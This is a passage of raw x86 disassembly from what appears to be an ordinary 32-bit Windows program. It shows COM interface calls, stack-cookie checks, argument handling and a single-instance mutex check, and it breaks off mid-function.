  4033d8:	mov    eax,ds:0x409004
  4033dd:	xor    eax,ebp
  4033df:	mov    DWORD PTR [ebp-0x4],eax
  4033e2:	push   esi
  4033e3:	push   edi
  4033e4:	call   0x403549
  4033e9:	lea    eax,[ebp-0x8]
  4033ec:	xor    edi,edi
  4033ee:	push   eax
  4033ef:	mov    DWORD PTR [ebp-0x8],edi
  4033f2:	call   0x404143
  4033f7:	push   eax
  4033f8:	push   0x4027a4
  4033fd:	push   0x1
  4033ff:	push   edi
  403400:	push   0x402994
  403405:	call   DWORD PTR ds:0x40a080
  40340b:	test   eax,eax
  40340d:	js     0x403430
  40340f:	mov    eax,DWORD PTR [ebp-0x8]
  403412:	lea    ecx,[ebp-0xc]
  403415:	push   ecx
  403416:	push   edi
  403417:	push   0x402508
  40341c:	mov    esi,DWORD PTR [eax]
  40341e:	push   0x4022d8
  403423:	push   eax
  403424:	mov    ecx,DWORD PTR [esi+0xc]
  403427:	call   DWORD PTR ds:0x40a1ec
  40342d:	call   DWORD PTR [esi+0xc]
  403430:	push   ecx
  403431:	call   0x4035c8
  403436:	mov    ecx,DWORD PTR [ebp-0x8]
  403439:	test   ecx,ecx
  40343b:	je     0x403450
  40343d:	mov    DWORD PTR [ebp-0x8],edi
  403440:	mov    eax,DWORD PTR [ecx]
  403442:	push   ecx
  403443:	mov    esi,DWORD PTR [eax+0x8]
  403446:	mov    ecx,esi
  403448:	call   DWORD PTR ds:0x40a1ec
  40344e:	call   esi
  403450:	mov    ecx,DWORD PTR [ebp-0x4]
  403453:	xor    eax,eax
  403455:	pop    edi
  403456:	xor    ecx,ebp
  403458:	pop    esi
  403459:	call   0x405d80
  40345e:	mov    esp,ebp
  403460:	pop    ebp
  403461:	ret    0x8
  403464:	int3   
  403465:	int3   
  403466:	int3   
  403467:	int3   
  403468:	int3   
  403469:	int3   
  40346a:	int3   
  40346b:	int3   
  40346c:	int3   
  40346d:	int3   
  40346e:	int3   
  40346f:	int3   
  403470:	mov    edi,edi
  403472:	push   esi
  403473:	push   0x1
  403475:	mov    esi,ecx
  403477:	push   0x306e
  40347c:	push   0x0
  40347e:	mov    DWORD PTR [esi+0x18],0x4034a0
  403485:	call   DWORD PTR ds:0x40a1e0
  40348b:	mov    ecx,esi
  40348d:	call   0x403549
  403492:	xor    eax,eax
  403494:	pop    esi
  403495:	ret    0x8
  403498:	int3   
  403499:	int3   
  40349a:	int3   
  40349b:	int3   
  40349c:	int3   
  40349d:	int3   
  40349e:	int3   
  40349f:	int3   
  4034a0:	mov    edi,edi
  4034a2:	push   ebp
  4034a3:	mov    ebp,esp
  4034a5:	sub    esp,0xc
  4034a8:	mov    eax,ds:0x409004
  4034ad:	xor    eax,ebp
  4034af:	mov    DWORD PTR [ebp-0x4],eax
  4034b2:	push   ebx
  4034b3:	push   esi
  4034b4:	push   edi
  4034b5:	lea    eax,[ebp-0x8]
  4034b8:	xor    ebx,ebx
  4034ba:	push   eax
  4034bb:	mov    DWORD PTR [ebp-0x8],ebx
  4034be:	call   0x404143
  4034c3:	push   eax
  4034c4:	push   0x4027a4
  4034c9:	push   0x1
  4034cb:	push   ebx
  4034cc:	push   0x402994
  4034d1:	call   DWORD PTR ds:0x40a080
  4034d7:	mov    edi,eax
  4034d9:	test   edi,edi
  4034db:	js     0x403500
  4034dd:	mov    eax,DWORD PTR [ebp-0x8]
  4034e0:	lea    ecx,[ebp-0xc]
  4034e3:	push   ecx
  4034e4:	push   ebx
  4034e5:	push   0x402568
  4034ea:	mov    esi,DWORD PTR [eax]
  4034ec:	push   0x4022d8
  4034f1:	push   eax
  4034f2:	mov    ecx,DWORD PTR [esi+0xc]
  4034f5:	call   DWORD PTR ds:0x40a1ec
  4034fb:	call   DWORD PTR [esi+0xc]
  4034fe:	mov    edi,eax
  403500:	test   BYTE PTR ds:0x4094c0,0x4
  403507:	je     0x403517
  403509:	push   ecx
  40350a:	push   ecx
  40350b:	mov    edx,edi
  40350d:	mov    ecx,0x402008
  403512:	call   0x404718
  403517:	mov    ecx,DWORD PTR [ebp-0x8]
  40351a:	test   ecx,ecx
  40351c:	je     0x403531
  40351e:	mov    DWORD PTR [ebp-0x8],ebx
  403521:	mov    eax,DWORD PTR [ecx]
  403523:	push   ecx
  403524:	mov    esi,DWORD PTR [eax+0x8]
  403527:	mov    ecx,esi
  403529:	call   DWORD PTR ds:0x40a1ec
  40352f:	call   esi
  403531:	mov    ecx,DWORD PTR [ebp-0x4]
  403534:	mov    eax,edi
  403536:	pop    edi
  403537:	pop    esi
  403538:	xor    ecx,ebp
  40353a:	pop    ebx
  40353b:	call   0x405d80
  403540:	mov    esp,ebp
  403542:	pop    ebp
  403543:	ret    
  403544:	int3   
  403545:	int3   
  403546:	int3   
  403547:	int3   
  403548:	int3   
  403549:	mov    edi,edi
  40354b:	push   ebp
  40354c:	mov    ebp,esp
  40354e:	push   ecx
  40354f:	mov    eax,ds:0x409004
  403554:	xor    eax,ebp
  403556:	mov    DWORD PTR [ebp-0x4],eax
  403559:	push   ebx
  40355a:	push   edi
  40355b:	mov    edi,ecx
  40355d:	mov    edx,DWORD PTR [edi+0x4]
  403560:	test   edx,edx
  403562:	je     0x403581
  403564:	mov    eax,DWORD PTR [edx]
  403566:	push   esi
  403567:	push   edx
  403568:	mov    esi,DWORD PTR [eax+0x94]
  40356e:	mov    ecx,esi
  403570:	call   DWORD PTR ds:0x40a1ec
  403576:	call   esi
  403578:	lea    ecx,[edi+0x4]
  40357b:	call   0x403e99
  403580:	pop    esi
  403581:	mov    ecx,DWORD PTR [edi+0xc]
  403584:	test   ecx,ecx
  403586:	je     0x4035b3
  403588:	push   edi
  403589:	call   DWORD PTR ds:0x40b000
  40358f:	mov    ecx,DWORD PTR [edi+0xc]
  403592:	add    edi,0x8
  403595:	test   ecx,ecx
  403597:	je     0x4035a1
  403599:	push   0x1
  40359b:	call   DWORD PTR ds:0x40b014
  4035a1:	mov    ecx,DWORD PTR [edi+0x4]
  4035a4:	test   ecx,ecx
  4035a6:	je     0x4035b3
  4035a8:	push   edi
  4035a9:	call   DWORD PTR ds:0x40b000
  4035af:	and    DWORD PTR [edi+0x4],0x0
  4035b3:	mov    ecx,DWORD PTR [ebp-0x4]
  4035b6:	pop    edi
  4035b7:	xor    ecx,ebp
  4035b9:	pop    ebx
  4035ba:	call   0x405d80
  4035bf:	mov    esp,ebp
  4035c1:	pop    ebp
  4035c2:	ret    
  4035c3:	int3   
  4035c4:	int3   
  4035c5:	int3   
  4035c6:	int3   
  4035c7:	int3   
  4035c8:	mov    edi,edi
  4035ca:	push   ebp
  4035cb:	mov    ebp,esp
  4035cd:	sub    esp,0x14
  4035d0:	xor    ecx,ecx
  4035d2:	lea    eax,[ebp-0x10]
  4035d5:	push   eax
  4035d6:	inc    ecx
  4035d7:	xor    edx,edx
  4035d9:	push   ecx
  4035da:	push   0x31e8
  4035df:	push   edx
  4035e0:	mov    DWORD PTR [ebp-0x10],edx
  4035e3:	mov    DWORD PTR [ebp-0xc],edx
  4035e6:	mov    DWORD PTR [ebp-0x8],ecx
  4035e9:	call   DWORD PTR ds:0x40a1e4
  4035ef:	mov    esp,ebp
  4035f1:	pop    ebp
  4035f2:	ret    0x4
  4035f5:	int3   
  4035f6:	int3   
  4035f7:	int3   
  4035f8:	int3   
  4035f9:	int3   
  4035fa:	mov    edi,edi
  4035fc:	push   ebp
  4035fd:	mov    ebp,esp
  4035ff:	sub    esp,0x20
  403602:	mov    eax,ds:0x409004
  403607:	xor    eax,ebp
  403609:	mov    DWORD PTR [ebp-0x4],eax
  40360c:	push   ebx
  40360d:	push   esi
  40360e:	push   edi
  40360f:	push   ecx
  403610:	push   ecx
  403611:	mov    ebx,ecx
  403613:	call   0x4051ee
  403618:	mov    esi,eax
  40361a:	test   esi,esi
  40361c:	js     0x4037bc
  403622:	mov    BYTE PTR [ebx+0x10],0x1
  403626:	call   DWORD PTR ds:0x40b008
  40362c:	mov    esi,eax
  40362e:	test   esi,esi
  403630:	js     0x4037bc
  403636:	cmp    DWORD PTR [ebx+0x14],0x0
  40363a:	jne    0x403643
  40363c:	mov    esi,0x402628
  403641:	jmp    0x403653
  403643:	cmp    DWORD PTR [ebx+0x14],0x2
  403647:	mov    esi,0x40265c
  40364c:	je     0x403653
  40364e:	mov    esi,0x402698
  403653:	xor    edi,edi
  403655:	mov    DWORD PTR [ebp-0x8],edi
  403658:	mov    DWORD PTR [ebp-0x10],edi
  40365b:	call   0x405362
  403660:	test   eax,eax
  403662:	je     0x403668
  403664:	mov    ecx,DWORD PTR [eax]
  403666:	jmp    0x40366a
  403668:	mov    ecx,edi
  40366a:	test   ecx,ecx
  40366c:	je     0x403683
  40366e:	lea    eax,[ebp-0x8]
  403671:	push   eax
  403672:	lea    eax,[ebp-0x10]
  403675:	push   eax
  403676:	push   edi
  403677:	push   edi
  403678:	push   esi
  403679:	call   DWORD PTR ds:0x40b038
  40367f:	mov    esi,eax
  403681:	jmp    0x403688
  403683:	mov    esi,0x80004005
  403688:	test   esi,esi
  40368a:	js     0x4037bc
  403690:	mov    DWORD PTR [ebp-0x20],edi
  403693:	cmp    DWORD PTR [ebx+0x14],edi
  403696:	jne    0x40369d
  403698:	push   0x67
  40369a:	pop    edx
  40369b:	jmp    0x4036ad
  40369d:	xor    edx,edx
  40369f:	cmp    DWORD PTR [ebx+0x14],0x2
  4036a3:	setne  dl
  4036a6:	dec    edx
  4036a7:	and    edx,0x6
  4036aa:	add    edx,0x6b
  4036ad:	or     DWORD PTR [ebp-0x1c],0xffffffff
  4036b1:	lea    eax,[ebp-0x20]
  4036b4:	or     DWORD PTR [ebp-0x18],0xffffffff
  4036b8:	push   eax
  4036b9:	call   0x404b3d
  4036be:	mov    edi,DWORD PTR [ebp-0x20]
  4036c1:	mov    esi,eax
  4036c3:	test   esi,esi
  4036c5:	js     0x403722
  4036c7:	mov    eax,ds:0x4094d4
  4036cc:	mov    esi,DWORD PTR [ebp-0x8]
  4036cf:	push   0x4026dc
  4036d4:	mov    DWORD PTR [ebp-0x14],eax
  4036d7:	call   DWORD PTR ds:0x40b034
  4036dd:	movzx  eax,ax
  4036e0:	mov    ecx,esi
  4036e2:	push   eax
  4036e3:	call   DWORD PTR ds:0x40b030
  4036e9:	mov    DWORD PTR [ebp-0xc],eax
  4036ec:	test   eax,eax
  4036ee:	je     0x40371d
  4036f0:	push   DWORD PTR [ebp-0x14]
  4036f3:	mov    edx,DWORD PTR ds:0x40b024
  4036f9:	mov    ecx,eax
  4036fb:	push   edi
  4036fc:	call   0x405188
  403701:	mov    esi,eax
  403703:	test   esi,esi
  403705:	js     0x403722
  403707:	push   DWORD PTR [ebp-0x14]
  40370a:	mov    edx,DWORD PTR ds:0x40b018
  403710:	mov    ecx,DWORD PTR [ebp-0xc]
  403713:	push   edi
  403714:	call   0x405188
  403719:	mov    esi,eax
  40371b:	jmp    0x403722
  40371d:	mov    esi,0x80004005
  403722:	test   edi,edi
  403724:	je     0x40372d
  403726:	push   edi
  403727:	call   DWORD PTR ds:0x40a088
  40372d:	test   esi,esi
  40372f:	js     0x4037bc
  403735:	push   DWORD PTR [ebp-0x10]
  403738:	mov    ecx,DWORD PTR [ebp-0x8]
  40373b:	call   DWORD PTR ds:0x40b00c
  403741:	mov    eax,DWORD PTR [ebp-0x8]
  403744:	lea    edi,[ebx+0x8]
  403747:	mov    ecx,DWORD PTR [edi+0x4]
  40374a:	mov    DWORD PTR [ebp-0xc],eax
  40374d:	test   ecx,ecx
  40374f:	je     0x40375f
  403751:	push   edi
  403752:	call   DWORD PTR ds:0x40b000
  403758:	and    DWORD PTR [edi+0x4],0x0
  40375c:	mov    eax,DWORD PTR [ebp-0xc]
  40375f:	mov    esi,0x80070057
  403764:	test   eax,eax
  403766:	je     0x40377e
  403768:	push   edi
  403769:	mov    ecx,eax
  40376b:	mov    DWORD PTR [edi+0x4],eax
  40376e:	call   DWORD PTR ds:0x40b010
  403774:	mov    esi,eax
  403776:	test   esi,esi
  403778:	jns    0x403782
  40377a:	and    DWORD PTR [edi+0x4],0x0
  40377e:	test   esi,esi
  403780:	js     0x4037b1
  403782:	mov    ecx,DWORD PTR [ebx+0xc]
  403785:	push   ebx
  403786:	call   DWORD PTR ds:0x40b010
  40378c:	mov    esi,eax
  40378e:	test   esi,esi
  403790:	js     0x4037b1
  403792:	mov    eax,DWORD PTR [ebp+0x8]
  403795:	push   DWORD PTR [ebx+0xc]
  403798:	push   eax
  403799:	mov    ecx,DWORD PTR [eax]
  40379b:	mov    esi,DWORD PTR [ecx+0xac]
  4037a1:	mov    ecx,esi
  4037a3:	call   DWORD PTR ds:0x40a1ec
  4037a9:	call   esi
  4037ab:	mov    esi,eax
  4037ad:	test   esi,esi
  4037af:	jns    0x4037bc
  4037b1:	mov    ecx,DWORD PTR [ebp-0x8]
  4037b4:	push   0x0
  4037b6:	call   DWORD PTR ds:0x40b014
  4037bc:	mov    ecx,DWORD PTR [ebp-0x4]
  4037bf:	mov    eax,esi
  4037c1:	pop    edi
  4037c2:	pop    esi
  4037c3:	xor    ecx,ebp
  4037c5:	pop    ebx
  4037c6:	call   0x405d80
  4037cb:	mov    esp,ebp
  4037cd:	pop    ebp
  4037ce:	ret    0x4
  4037d1:	int3   
  4037d2:	int3   
  4037d3:	int3   
  4037d4:	int3   
  4037d5:	int3   
  4037d6:	mov    edi,edi
  4037d8:	push   ebp
  4037d9:	mov    ebp,esp
  4037db:	sub    esp,0x2c
  4037de:	mov    eax,ds:0x409004
  4037e3:	xor    eax,ebp
  4037e5:	mov    DWORD PTR [ebp-0x4],eax
  4037e8:	and    DWORD PTR [ebp-0x18],0x0
  4037ec:	lea    eax,[ebp-0x18]
  4037ef:	push   ebx
  4037f0:	push   esi
  4037f1:	push   edi
  4037f2:	push   eax
  4037f3:	push   0x402784
  4037f8:	push   0x1
  4037fa:	push   0x0
  4037fc:	push   0x402984
  403801:	mov    ebx,ecx
  403803:	call   DWORD PTR ds:0x40a080
  403809:	mov    edi,eax
  40380b:	test   edi,edi
  40380d:	js     0x403ac4
  403813:	mov    eax,DWORD PTR [ebp-0x18]
  403816:	push   0x1
  403818:	push   eax
  403819:	mov    ecx,DWORD PTR [eax]
  40381b:	mov    esi,DWORD PTR [ecx+0xc]
  40381e:	mov    ecx,esi
  403820:	call   DWORD PTR ds:0x40a1ec
  403826:	call   esi
  403828:	mov    esi,DWORD PTR [ebp-0x18]
  40382b:	lea    edi,[ebx+0x4]
  40382e:	mov    ecx,edi
  403830:	call   0x403e99
  403835:	mov    eax,DWORD PTR [esi]
  403837:	push   edi
  403838:	push   esi
  403839:	mov    esi,DWORD PTR [eax+0x28]
  40383c:	mov    ecx,esi
  40383e:	call   DWORD PTR ds:0x40a1ec
  403844:	call   esi
  403846:	mov    edi,eax
  403848:	test   edi,edi
  40384a:	js     0x403ac4
  403850:	and    DWORD PTR [ebp-0x28],0x0
  403854:	cmp    DWORD PTR [ebx+0x14],0x0
  403858:	jne    0x403861
  40385a:	mov    edx,0x80
  40385f:	jmp    0x403871
  403861:	xor    edx,edx
  403863:	cmp    DWORD PTR [ebx+0x14],0x2
  403867:	setne  dl
  40386a:	dec    edx
  40386b:	and    edx,0x7
  40386e:	add    edx,0x69
  403871:	or     DWORD PTR [ebp-0x24],0xffffffff
  403875:	lea    eax,[ebp-0x28]
  403878:	or     DWORD PTR [ebp-0x20],0xffffffff
  40387c:	push   eax
  40387d:	call   0x404b3d
  403882:	mov    edi,eax
  403884:	test   edi,edi
  403886:	js     0x403ab5
  40388c:	mov    eax,DWORD PTR [ebx+0x4]
  40388f:	push   DWORD PTR [ebp-0x28]
  403892:	push   eax
  403893:	mov    ecx,DWORD PTR [eax]
  403895:	mov    esi,DWORD PTR [ecx+0x10]
  403898:	mov    ecx,esi
  40389a:	call   DWORD PTR ds:0x40a1ec
  4038a0:	call   esi
  4038a2:	mov    edi,eax
  4038a4:	test   edi,edi
  4038a6:	js     0x403ab5
  4038ac:	push   DWORD PTR [ebx+0x4]
  4038af:	mov    ecx,ebx
  4038b1:	call   0x4035fa
  4038b6:	mov    edi,eax
  4038b8:	test   edi,edi
  4038ba:	js     0x403ab5
  4038c0:	and    DWORD PTR [ebp-0x1c],0x0
  4038c4:	lea    ecx,[ebp-0xc]
  4038c7:	cmp    DWORD PTR [ebx+0x14],0x0
  4038cb:	mov    edx,ebx
  4038cd:	jne    0x4039a7
  4038d3:	lea    eax,[ebp-0x1c]
  4038d6:	push   0x403470
  4038db:	mov    DWORD PTR [ebp-0x8],eax
  4038de:	call   0x40418a
  4038e3:	lea    ecx,[ebp-0x8]
  4038e6:	mov    esi,DWORD PTR [eax]
  4038e8:	call   0x403e2b
  4038ed:	push   eax
  4038ee:	push   0x65
  4038f0:	push   ecx
  4038f1:	mov    ecx,esi
  4038f3:	call   0x402e58
  4038f8:	lea    ecx,[ebp-0xc]
  4038fb:	mov    edi,eax
  4038fd:	call   0x402dd5
  403902:	test   edi,edi
  403904:	js     0x403aad
  40390a:	and    DWORD PTR [ebp-0x8],0x0
  40390e:	lea    eax,[ebp-0x8]
  403911:	push   0x403360
  403916:	mov    edx,ebx
  403918:	mov    DWORD PTR [ebp-0xc],eax
  40391b:	lea    ecx,[ebp-0x10]
  40391e:	call   0x40418a
  403923:	lea    ecx,[ebp-0xc]
  403926:	mov    esi,DWORD PTR [eax]
  403928:	call   0x403e2b
  40392d:	push   eax
  40392e:	push   0x66
  403930:	push   ecx
  403931:	mov    ecx,esi
  403933:	call   0x402e58
  403938:	lea    ecx,[ebp-0x10]
  40393b:	mov    edi,eax
  40393d:	call   0x402dd5
  403942:	test   edi,edi
  403944:	js     0x403a89
  40394a:	mov    eax,DWORD PTR [ebp-0x8]
  40394d:	lea    ecx,[ebp-0x14]
  403950:	mov    DWORD PTR [ebp-0x14],eax
  403953:	mov    eax,DWORD PTR [ebp-0x1c]
  403956:	mov    DWORD PTR [ebp-0x10],eax
  403959:	mov    eax,DWORD PTR [ebx+0x4]
  40395c:	push   ecx
  40395d:	push   0x2
  40395f:	push   eax
  403960:	mov    esi,DWORD PTR [eax]
  403962:	mov    ecx,DWORD PTR [esi+0x20]
  403965:	call   DWORD PTR ds:0x40a1ec
  40396b:	call   DWORD PTR [esi+0x20]
  40396e:	mov    edi,eax
  403970:	test   edi,edi
  403972:	js     0x403a89
  403978:	mov    eax,DWORD PTR [ebx+0x4]
  40397b:	push   0x0
  40397d:	push   eax
  40397e:	mov    ecx,DWORD PTR [eax]
  403980:	mov    esi,DWORD PTR [ecx+0x2c]
  403983:	mov    ecx,esi
  403985:	call   DWORD PTR ds:0x40a1ec
  40398b:	call   esi
  40398d:	mov    eax,DWORD PTR [ebx+0x4]
  403990:	push   0x1
  403992:	push   eax
  403993:	mov    ecx,DWORD PTR [eax]
  403995:	mov    esi,DWORD PTR [ecx+0x3c]
  403998:	mov    ecx,esi
  40399a:	call   DWORD PTR ds:0x40a1ec
  4039a0:	call   esi
  4039a2:	jmp    0x403a89
  4039a7:	cmp    DWORD PTR [ebx+0x14],0x2
  4039ab:	jne    0x403a38
  4039b1:	lea    eax,[ebp-0x1c]
  4039b4:	push   0x4033d0
  4039b9:	mov    DWORD PTR [ebp-0x10],eax
  4039bc:	call   0x40418a
  4039c1:	lea    ecx,[ebp-0x10]
  4039c4:	mov    esi,DWORD PTR [eax]
  4039c6:	call   0x403e2b
  4039cb:	push   eax
  4039cc:	push   0x68
  4039ce:	push   ecx
  4039cf:	mov    ecx,esi
  4039d1:	call   0x402e58
  4039d6:	lea    ecx,[ebp-0xc]
  4039d9:	mov    edi,eax
  4039db:	call   0x402dd5
  4039e0:	test   edi,edi
  4039e2:	js     0x403aad
  4039e8:	and    DWORD PTR [ebp-0x8],0x0
  4039ec:	lea    eax,[ebp-0x8]
  4039ef:	push   0x403360
  4039f4:	mov    edx,ebx
  4039f6:	mov    DWORD PTR [ebp-0x10],eax
  4039f9:	lea    ecx,[ebp-0xc]
  4039fc:	call   0x40418a
  403a01:	lea    ecx,[ebp-0x10]
  403a04:	mov    esi,DWORD PTR [eax]
  403a06:	call   0x403e2b
  403a0b:	push   eax
  403a0c:	push   0x73
  403a0e:	push   ecx
  403a0f:	mov    ecx,esi
  403a11:	call   0x402e58
  403a16:	lea    ecx,[ebp-0xc]
  403a19:	mov    edi,eax
  403a1b:	call   0x402dd5
  403a20:	test   edi,edi
  403a22:	js     0x403a89
  403a24:	mov    eax,DWORD PTR [ebp-0x8]
  403a27:	lea    ecx,[ebp-0x14]
  403a2a:	mov    DWORD PTR [ebp-0x14],eax
  403a2d:	mov    eax,DWORD PTR [ebp-0x1c]
  403a30:	push   ecx
  403a31:	mov    DWORD PTR [ebp-0x10],eax
  403a34:	push   0x2
  403a36:	jmp    0x403a75
  403a38:	and    DWORD PTR [ebp-0x8],0x0
  403a3c:	lea    eax,[ebp-0x8]
  403a3f:	push   0x403360
  403a44:	mov    DWORD PTR [ebp-0x10],eax
  403a47:	call   0x40418a
  403a4c:	lea    ecx,[ebp-0x10]
  403a4f:	mov    esi,DWORD PTR [eax]
  403a51:	call   0x403e2b
  403a56:	push   eax
  403a57:	push   0x6a
  403a59:	push   ecx
  403a5a:	mov    ecx,esi
  403a5c:	call   0x402e58
  403a61:	lea    ecx,[ebp-0xc]
  403a64:	mov    edi,eax
  403a66:	call   0x402dd5
  403a6b:	test   edi,edi
  403a6d:	js     0x403a89
  403a6f:	lea    ecx,[ebp-0x8]
  403a72:	push   ecx
  403a73:	push   0x1
  403a75:	mov    eax,DWORD PTR [ebx+0x4]
  403a78:	push   eax
  403a79:	mov    esi,DWORD PTR [eax]
  403a7b:	mov    ecx,DWORD PTR [esi+0x20]
  403a7e:	call   DWORD PTR ds:0x40a1ec
  403a84:	call   DWORD PTR [esi+0x20]
  403a87:	mov    edi,eax
  403a89:	lea    ecx,[ebp-0x8]
  403a8c:	call   0x402dd5
  403a91:	test   edi,edi
  403a93:	js     0x403aad
  403a95:	mov    eax,DWORD PTR [ebx+0x4]
  403a98:	push   eax
  403a99:	mov    ecx,DWORD PTR [eax]
  403a9b:	mov    esi,DWORD PTR [ecx+0x88]
  403aa1:	mov    ecx,esi
  403aa3:	call   DWORD PTR ds:0x40a1ec
  403aa9:	call   esi
  403aab:	mov    edi,eax
  403aad:	lea    ecx,[ebp-0x1c]
  403ab0:	call   0x402dd5
  403ab5:	cmp    DWORD PTR [ebp-0x28],0x0
  403ab9:	je     0x403ac4
  403abb:	push   DWORD PTR [ebp-0x28]
  403abe:	call   DWORD PTR ds:0x40a088
  403ac4:	cmp    DWORD PTR [ebx+0x14],0x0
  403ac8:	jne    0x403adf
  403aca:	test   DWORD PTR ds:0x4094c0,0x800
  403ad4:	je     0x403aff
  403ad6:	push   ecx
  403ad7:	push   ecx
  403ad8:	mov    ecx,0x402128
  403add:	jmp    0x403af8
  403adf:	cmp    DWORD PTR [ebx+0x14],0x1
  403ae3:	jne    0x403aff
  403ae5:	test   DWORD PTR ds:0x4094c0,0x1000
  403aef:	je     0x403aff
  403af1:	push   ecx
  403af2:	push   ecx
  403af3:	mov    ecx,0x402048
  403af8:	mov    edx,edi
  403afa:	call   0x404718
  403aff:	mov    ecx,DWORD PTR [ebp-0x18]
  403b02:	test   ecx,ecx
  403b04:	je     0x403b1a
  403b06:	and    DWORD PTR [ebp-0x18],0x0
  403b0a:	mov    eax,DWORD PTR [ecx]
  403b0c:	push   ecx
  403b0d:	mov    esi,DWORD PTR [eax+0x8]
  403b10:	mov    ecx,esi
  403b12:	call   DWORD PTR ds:0x40a1ec
  403b18:	call   esi
  403b1a:	mov    ecx,DWORD PTR [ebp-0x4]
  403b1d:	mov    eax,edi
  403b1f:	pop    edi
  403b20:	pop    esi
  403b21:	xor    ecx,ebp
  403b23:	pop    ebx
  403b24:	call   0x405d80
  403b29:	mov    esp,ebp
  403b2b:	pop    ebp
  403b2c:	ret    
  403b2d:	int3   
  403b2e:	int3   
  403b2f:	int3   
  403b30:	int3   
  403b31:	int3   
  403b32:	mov    edi,edi
  403b34:	push   ebp
  403b35:	mov    ebp,esp
  403b37:	sub    esp,0x10
  403b3a:	and    DWORD PTR [ebp-0x4],0x0
  403b3e:	lea    eax,[ebp-0x4]
  403b41:	push   esi
  403b42:	push   edi
  403b43:	push   eax
  403b44:	push   ecx
  403b45:	call   0x405610
  403b4a:	mov    edi,0x4023a0
  403b4f:	mov    edx,edi
  403b51:	test   eax,eax
  403b53:	js     0x403b5c
  403b55:	mov    eax,DWORD PTR [ebp-0x4]
  403b58:	inc    eax
  403b59:	push   eax
  403b5a:	jmp    0x403b5e
  403b5c:	push   0x1
  403b5e:	push   0x402380
  403b63:	call   0x405654
  403b68:	mov    esi,eax
  403b6a:	test   esi,esi
  403b6c:	js     0x403b9b
  403b6e:	lea    eax,[ebp-0xc]
  403b71:	push   eax
  403b72:	call   DWORD PTR ds:0x40a010
  403b78:	push   0x8
  403b7a:	lea    eax,[ebp-0xc]
  403b7d:	mov    edx,edi
  403b7f:	push   eax
  403b80:	push   0x3
  403b82:	push   0x402450
  403b87:	call   0x40559a
  403b8c:	mov    esi,eax
  403b8e:	test   esi,esi
  403b90:	jle    0x403b9b
  403b92:	movzx  esi,si
  403b95:	or     esi,0x80070000
  403b9b:	test   BYTE PTR ds:0x4094c0,0x4
  403ba2:	je     0x403bb2
  403ba4:	push   ecx
  403ba5:	push   ecx
  403ba6:	mov    edx,esi
  403ba8:	mov    ecx,0x4020f0
  403bad:	call   0x404718
  403bb2:	pop    edi
  403bb3:	mov    eax,esi
  403bb5:	pop    esi
  403bb6:	mov    esp,ebp
  403bb8:	pop    ebp
  403bb9:	ret    
  403bba:	int3   
  403bbb:	int3   
  403bbc:	int3   
  403bbd:	int3   
  403bbe:	int3   
  403bbf:	mov    edi,edi
  403bc1:	push   ebp
  403bc2:	mov    ebp,esp
  403bc4:	sub    esp,0xc
  403bc7:	push   esi
  403bc8:	push   ecx
  403bc9:	push   ecx
  403bca:	call   0x4046c6
  403bcf:	mov    eax,DWORD PTR [ebp+0x8]
  403bd2:	mov    ecx,DWORD PTR [ebp+0x10]
  403bd5:	mov    ds:0x4094d4,eax
  403bda:	lea    eax,[ebp-0xc]
  403bdd:	push   eax
  403bde:	lea    eax,[ebp-0x8]
  403be1:	push   eax
  403be2:	call   0x405928
  403be7:	mov    esi,eax
  403be9:	test   esi,esi
  403beb:	js     0x403d0b
  403bf1:	xor    esi,esi
  403bf3:	push   ebx
  403bf4:	push   edi
  403bf5:	xor    edi,edi
  403bf7:	inc    esi
  403bf8:	mov    DWORD PTR [ebp-0x4],edi
  403bfb:	cmp    DWORD PTR [ebp-0xc],esi
  403bfe:	jne    0x403c4f
  403c00:	mov    ebx,DWORD PTR [ebp-0x8]
  403c03:	xor    ecx,ecx
  403c05:	mov    eax,DWORD PTR [ebx]
  403c07:	cmp    cx,WORD PTR [eax]
  403c0a:	je     0x403c2a
  403c0c:	push   esi
  403c0d:	push   0xffffffff
  403c0f:	add    eax,0x2
  403c12:	push   eax
  403c13:	push   0xffffffff
  403c15:	push   0x40271c
  403c1a:	call   DWORD PTR ds:0x40a038
  403c20:	cmp    eax,0x2
  403c23:	jne    0x403c2a
  403c25:	mov    DWORD PTR [ebp-0x4],esi
  403c28:	jmp    0x403c4f
  403c2a:	mov    eax,DWORD PTR [ebx]
  403c2c:	xor    ecx,ecx
  403c2e:	cmp    cx,WORD PTR [eax]
  403c31:	je     0x403c4f
  403c33:	push   esi
  403c34:	push   0xffffffff
  403c36:	add    eax,0x2
  403c39:	push   eax
  403c3a:	push   0xffffffff
  403c3c:	push   0x40273c
  403c41:	call   DWORD PTR ds:0x40a038
  403c47:	cmp    eax,0x2
  403c4a:	jne    0x403c4f
  403c4c:	mov    DWORD PTR [ebp-0x4],eax
  403c4f:	push   0x2
  403c51:	push   edi
  403c52:	call   DWORD PTR ds:0x40a07c
  403c58:	mov    esi,eax
  403c5a:	test   esi,esi
  403c5c:	js     0x403d00
  403c62:	push   0x4026f4
  403c67:	push   edi
  403c68:	push   edi
  403c69:	call   DWORD PTR ds:0x40a014
  403c6f:	mov    ebx,eax
  403c71:	test   ebx,ebx
  403c73:	je     0x403cfa
  403c79:	call   DWORD PTR ds:0x40a018
  403c7f:	cmp    eax,0xb7
  403c84:	jne    0x403c8f
  403c86:	push   ebx
  403c87:	call   DWORD PTR ds:0x40a01c
  403c8d:	mov    ebx,edi
  403c8f:	test   ebx,ebx
  403c91:	je     0x403cfa
  403c93:	push   0x402120
  403c98:	push   0x1c
  403c9a:	call   0x405dbb
  403c9f:	mov    edi,eax
  403ca1:	pop    ecx
  403ca2:	pop    ecx
  403ca3:	test   edi,edi
  403ca5:	je     0x403cc7
  403ca7:	xor    eax,eax
  403ca9:	mov    DWORD PTR [edi],0x4021b0
  403caf:	mov    DWORD PTR [edi+0x4],eax
  403cb2:	mov    DWORD PTR [edi+0xc],eax
  403cb5:	mov    DWORD PTR [edi+0x8],0x402198
  403cbc:	mov    BYTE PTR [edi+0x10],al
  403cbf:	mov    DWORD PTR [edi+0x14],eax
  403cc2:	mov    DWORD PTR [edi+0x18],eax
  403cc5:	jmp    0x403cc9
  403cc7:	xor    edi,edi
  403cc9:	mov    esi,edi
  403ccb:	neg    esi
  403ccd:	sbb    esi,esi
  403ccf:	and    esi,0x7ff8fff2
  403cd5:	add    esi,0x8007000e
  403cdb:	js     0x403ce7
  403cdd:	push   DWORD PTR [ebp-0x4]
  403ce0:	mov    ecx,edi
  403ce2:	call   0x4030f9
  403ce7:	push   ebx
  403ce8:	call   DWORD PTR ds:0x40a01c
  403cee:	test   edi,edi
  403cf0:	je     0x403cfa
  403cf2:	push   ecx
  403cf3:	mov    ecx,edi
